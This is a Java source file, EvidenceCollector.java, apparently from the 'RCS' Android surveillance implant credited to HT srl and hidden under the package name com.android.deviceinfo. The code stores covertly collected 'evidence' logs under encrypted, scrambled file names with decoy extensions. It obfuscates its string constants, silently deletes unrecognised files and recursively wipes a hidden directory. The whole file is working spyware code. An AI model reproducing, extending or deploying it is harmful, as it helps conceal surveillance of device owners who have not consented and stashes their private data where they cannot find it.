/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : EvidenceCollector.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.deviceinfo.evidence;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.TreeMap;
import java.util.Vector;

import android.content.Context;

import com.android.deviceinfo.Status;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.crypto.Encryption;
import com.android.deviceinfo.crypto.Keys;
import com.android.deviceinfo.file.AutoFile;
import com.android.deviceinfo.file.Path;
import com.android.deviceinfo.util.ByteArray;
import com.android.deviceinfo.util.Check;
import com.android.m.M;

// TODO: Auto-generated Javadoc
/**
 * The Class EvidenceCollector.
 */
public class EvidenceCollector {
	/** The debug. */
	private static final String TAG = "EvidenceColl"; //$NON-NLS-1$
	/** The Constant LOG_EXTENSION. */
	public static final String LOG_EXTENSION = M.e(".mob"); //$NON-NLS-1$

	/** The Constant LOG_DIR_PREFIX. */
	public static final String LOG_DIR_PREFIX = M.e("Z"); // Utilizzato per creare le //$NON-NLS-1$
	// Log Dir
	/** The Constant LOG_DIR_FORMAT. */
	public static final String LOG_DIR_FORMAT = M.e("Z*"); // Utilizzato nella //$NON-NLS-1$
	// ricerca delle Log Dir
	/** The Constant LOG_PER_DIRECTORY. */
	public static final int LOG_PER_DIRECTORY = 500; // Numero massimo di log
	// per ogni directory
	/** The Constant MAX_LOG_NUM. */
	public static final int MAX_LOG_NUM = 25000; // Numero massimo di log che

	/** The Constant PROG_FILENAME. */
	private static final String PROG_FILENAME = M.e("geb"); //$NON-NLS-1$
	public static final String LOG_TMP = M.e(".dat"); //$NON-NLS-1$

	/** The seed. */
	int seed;

	/** The singleton. */
	private volatile static EvidenceCollector singleton;
	private static Object evidenceCollectorLock = new Object();

	/**
	 * Self.
	 * 
	 * @return the evidence collector
	 */
	public static EvidenceCollector self() {
		if (singleton == null) {
			synchronized (evidenceCollectorLock) {
				if (singleton == null) {
					singleton = new EvidenceCollector();
				}
			}
		}

		return singleton;
	}

	/**
	 * Decrypt name.
	 * 
	 * @param logMask
	 *            the log mask
	 * @return the string
	 */
	public static String decryptName(final String logMask) {
		return Encryption.decryptName(logMask, Keys.self().getChallengeKey()[0]);
	}

	/**
	 * Encrypt name.
	 * 
	 * @param logMask
	 *            the log mask
	 * @return the string
	 */
	public static String encryptName(final String logMask) {
		final byte[] key = Keys.self().getChallengeKey();
		return Encryption.encryptName(logMask, key[0]);
	}

	// public boolean storeToMMC;
	/** The log vector. */
	Vector<String> logVector;

	/** The log progressive. */
	private int logProgressive;

	// Keys keys;

	/**
	 * Instantiates a new log collector.
	 */
	private EvidenceCollector() {
		super();
		logVector = new Vector<String>();

		logProgressive = deserializeProgressive();
		flushEvidences();
		// keys = Encryption.getKeys();
		// seed = keys.getChallengeKey()[0];
	}

	/**
	 * Removes the progressive.
	 */
	public synchronized void removeProgressive() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " Info: Removing Progressive");//$NON-NLS-1$
		}
		final Context content = Status.getAppContext();
		try {
			content.deleteFile(PROG_FILENAME);
		} catch (Exception ex) {
			if (Cfg.EXCEPTION) {
				Check.log(ex);
			}

		}
	}

	/**
	 * Deserialize progressive.
	 * 
	 * @return the int
	 */
	private synchronized int deserializeProgressive() {
		final Context content = Status.getAppContext();
		int progessive = 0;
		try {
			//TODO: togliere, usare la data di sistema
			final FileInputStream fos = content.openFileInput(PROG_FILENAME);

			final byte[] prog = new byte[4];
			fos.read(prog);
			progessive = ByteArray.byteArrayToInt(prog, 0);

			fos.close();
		} catch (final IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Warn: " + e.toString());//$NON-NLS-1$
			}
		}

		return progessive;
	}

	/**
	 * Gets the new progressive.
	 * 
	 * @return the new progressive
	 */
	protected synchronized int getNewProgressive() {
		logProgressive++;

		final Context content = Status.getAppContext();

		try {
			final FileOutputStream fos = content.openFileOutput(PROG_FILENAME, Context.MODE_PRIVATE);

			fos.write(ByteArray.intToByteArray(logProgressive));
			fos.close();
		} catch (final IOException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: " + e.toString());//$NON-NLS-1$
			}
		}

		return logProgressive;
	}

	/**
	 * Make date name.
	 * 
	 * @param date
	 *            the date
	 * @return the string
	 */
	private static String makeDateName(final Date date) {
		final long millis = date.getTime();
		final long mask = (long) 1E4;
		final int lodate = (int) (millis % mask);
		final int hidate = (int) (millis / mask);

		final String newname = Integer.toHexString(lodate) + Integer.toHexString(hidate);

		return newname;
	}

	/**
	 * Make new name.
	 * 
	 * @param log
	 *            the log
	 * @param logType
	 *            the log type
	 * @return the vector
	 */
	public synchronized Name makeNewName(final Evidence log, final String logType) {
		final Date timestamp = log.timestamp;
		final int progressive = getNewProgressive();

		if (Cfg.DEBUG) {
			Check.asserts(progressive >= 0, "makeNewName fail progressive >=0"); //$NON-NLS-1$
		}

		final String basePath = Path.logs();

		final String blockDir = M.e("l_") + (progressive / LOG_PER_DIRECTORY); //$NON-NLS-1$

		// http://www.rgagnon.com/javadetails/java-0021.html
		final String mask = M.e("0000"); //$NON-NLS-1$
		final String ds = Long.toString(progressive % 10000); // double to
		// string
		final int size = mask.length() - ds.length();
		if (Cfg.DEBUG) {
			Check.asserts(size >= 0, "makeNewName: failed size>0"); //$NON-NLS-1$
		}
		final String paddedProgressive = mask.substring(0, size) + ds;

		final String fileName = paddedProgressive + "" + logType + "" + makeDateName(timestamp); //$NON-NLS-1$ //$NON-NLS-2$

		final String encName = encryptName(fileName + LOG_EXTENSION);

		if (Cfg.DEBUG) {
			Check.asserts(!encName.endsWith("mob"), "makeNewName: " + encName + " ch: " + seed + " not scrambled: " //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
					+ fileName + LOG_EXTENSION);
		}

		final Name name = new Name();
		name.progressive = progressive;
		name.basePath = basePath;
		name.blockDir = blockDir;
		name.encName = encName;
		name.fileName = fileName;

		return name;
	}

	/**
	 * Removes the.
	 * 
	 * @param logName
	 *            the log name
	 */
	public void remove(final String logName) {
		// if(AutoConfig.DEBUG) Check.log( TAG + " Removing file: " + logName) ;//$NON-NLS-1$
		final AutoFile file = new AutoFile(logName);
		if (file.exists()) {
			file.delete();
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Warn: " + "File doesn't exists: " + logName);//$NON-NLS-1$ //$NON-NLS-2$
			}
		}
	}

	/**
	 * Rimuove i file uploadati e le directory dei log dal sistema e dalla MMC.
	 * 
	 * @param numFiles
	 *            the num files
	 * @return the int
	 */
	public synchronized int removeHidden() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (removeHidden)");//$NON-NLS-1$
		}
		final int removed = removeRecursive(new File(Path.hidden()), Integer.MAX_VALUE);
		return removed;
	}

	/**
	 * Removes the log recursive.
	 * 
	 * @param basePath
	 *            the base path
	 * @param numFiles
	 *            the num files
	 * @return the int
	 */
	private int removeRecursive(final File basePath, final int numFiles) {
		int numLogsDeleted = 0;

		// File fc;
		try {
			// fc = new File(basePath);

			if (basePath.isDirectory()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (removeRecursive): " + basePath.getName());//$NON-NLS-1$
				}
				final File[] fileLogs = basePath.listFiles();

				for (final File file : fileLogs) {
					final int removed = removeRecursive(file, numFiles - numLogsDeleted);
					numLogsDeleted += removed;
				}
			}

			if (!basePath.delete()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (removeRecursive) Error: " + basePath.getAbsolutePath());//$NON-NLS-1$
				}
			} else {
				numLogsDeleted += 1;
			}

		} catch (final Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: removeLog: " + basePath + " ex: " + e);//$NON-NLS-1$ //$NON-NLS-2$
			}
		}
		if (Cfg.DEBUG) {
			Check.log(TAG + " removeLogRecursive removed: " + numLogsDeleted);//$NON-NLS-1$
		}
		return numLogsDeleted;

	}

	/**
	 * Restituisce la lista ordinata dele dir secondo il nome.
	 * 
	 * @param currentPath
	 *            the current path
	 * @return the vector
	 */
	public static Vector<String> scanForDirLogs(final String currentPath) {
		if (Cfg.DEBUG) {
			Check.requires(currentPath != null, "null argument"); //$NON-NLS-1$
		}
		File fc;

		final Vector<String> vector = new Vector<String>();
		try {
			fc = new File(currentPath);
			if (fc.isDirectory()) {
				final String[] fileLogs = fc.list();

				for (final String dir : fileLogs) {
					final File fdir = new File(currentPath + dir);
					if (fdir.isDirectory()) {

						vector.addElement(dir + "/"); //$NON-NLS-1$
						if (Cfg.DEBUG) {
							Check.log(TAG + " scanForDirLogs adding: " + dir);//$NON-NLS-1$
						}
					}
				}
			}
		} catch (final Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: scanForDirLogs: " + e);//$NON-NLS-1$
			}
		}
		if (Cfg.DEBUG) {
			Check.log(TAG + " scanForDirLogs #: " + vector.size());//$NON-NLS-1$
		}
		return vector;
	}

	/**
	 * Estrae la lista di log nella forma *.MOB dentro la directory specificata
	 * da currentPath, nella forma 1_n Restituisce la lista ordinata secondo il
	 * nome demangled
	 * 
	 * @param currentPath
	 *            the current path
	 * @param dir
	 *            the dir
	 * @return the vector
	 */
	public static String[] scanForEvidences(final String currentPath, final String dir) {
		if (Cfg.DEBUG) {
			Check.requires(currentPath != null, "null argument"); //$NON-NLS-1$
		}
		if (Cfg.DEBUG) {
			Check.requires(!currentPath.startsWith("file://"), "currentPath shouldn't start with file:// : " //$NON-NLS-1$ //$NON-NLS-2$
					+ currentPath);
		}

		final TreeMap<String, String> map = new TreeMap<String, String>();

		File fcDir = null;
		// FileConnection fcFile = null;
		try {
			fcDir = new File(currentPath + dir);

			final String[] fileLogs = fcDir.list();

			for (final String file : fileLogs) {
				// fcFile = (FileConnection) Connector.open(fcDir.getURL() +
				// file);
				// e' un file, vediamo se e' un file nostro
				final String logMask = EvidenceCollector.LOG_EXTENSION;
				final String encLogMask = encryptName(logMask);

				if (file.endsWith(encLogMask)) {
					// String encName = fcFile.getName();
					final String plainName = decryptName(file);
					map.put(plainName, file);
				} else if (file.endsWith(EvidenceCollector.LOG_TMP) && notVeryOld(fcDir, file)) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " ignoring temp file: " + decryptName(file));//$NON-NLS-1$
					}
				} else {
					if (Cfg.DEBUG) {
						Check.log(TAG + " Info: wrong name, deleting: " + fcDir + "/" + decryptName(file));//$NON-NLS-1$ //$NON-NLS-2$
					}
					final File toDelete = new File(fcDir, file);
					toDelete.delete();
				}
			}

		} catch (final Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: scanForLogs: " + e);//$NON-NLS-1$
			}
		} finally {

		}
		if (Cfg.DEBUG) {
			Check.log(TAG + " scanForLogs numDirs: " + map.size());//$NON-NLS-1$
		}
		final ArrayList<String> val = new ArrayList<String>(map.values());
		// Collections.reverse(val);
		return val.toArray(new String[] {});
	}

	private static boolean notVeryOld(File fcDir, String file) {
		final File toVerify = new File(fcDir, file);
		Date now = new Date();
		long oldFile = 1000 * 3600 * 24;
		long elapsed = now.getTime() - toVerify.lastModified();
		boolean young = elapsed < oldFile;

		return young;
	}

	/**
	 * I file tmp vengono rinominati in mob
	 */
	public static void flushEvidences() {
		String basePath = Path.logs();

		final Vector<String> dirs = scanForDirLogs(basePath);
		final int dsize = dirs.size();
		if (Cfg.DEBUG) {
			Check.log(TAG + " sendEvidences #directories: " + dsize); //$NON-NLS-1$
		}
		for (int i = 0; i < dsize; ++i) {
			final String dir = (String) dirs.elementAt(i); // per reverse:
															// dsize-i-1

			File fcDir = null;

			try {
				fcDir = new File(basePath + dir);

				final String[] fileLogs = fcDir.list();

				for (final String file : fileLogs) {
					// fcFile = (FileConnection) Connector.open(fcDir.getURL() +
					// file);
					// e' un file, vediamo se e' un file nostro
					if (file.endsWith(EvidenceCollector.LOG_TMP)) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " WARNING (flushEvidences): " + decryptName(file));
						}

						AutoFile tmp = new AutoFile(fcDir.getPath(), file);
						tmp.dropExtension(EvidenceCollector.LOG_TMP);
					}
				}

			} catch (final Exception e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " Error: scanForLogs: " + e);//$NON-NLS-1$
				}
			} finally {

			}
		}
	}
}
